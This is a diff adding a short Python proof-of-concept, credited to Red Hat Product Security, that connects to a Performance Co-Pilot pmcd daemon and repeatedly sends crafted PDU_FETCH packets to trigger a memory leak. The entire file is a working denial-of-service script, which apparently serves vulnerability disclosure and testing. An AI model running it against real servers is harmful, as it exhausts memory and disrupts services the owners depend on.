@@ -1,0 +1,19 @@
+#
+# usage: python leak-fetch HOST
+#
+# Connects to pmcd on HOST and sends a crafted PDU_FETCH packet which triggers a memory leak.
+#
+# Florian Weimer / Red Hat Product Security Team
+#
+import socket
+import sys
+import pcppdu
+_, host, count = sys.argv
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((host, 44321))
+pcppdu.client_handshake(sock, from_=1)
+iterations = int(count)
+for i in range(iterations):
+    pcppdu.send_fetch(sock, from_=1, ctxnum=1, pmidlist=(1,) * 10000)
+    pcppdu.read_pdu(sock)
+sock.close()
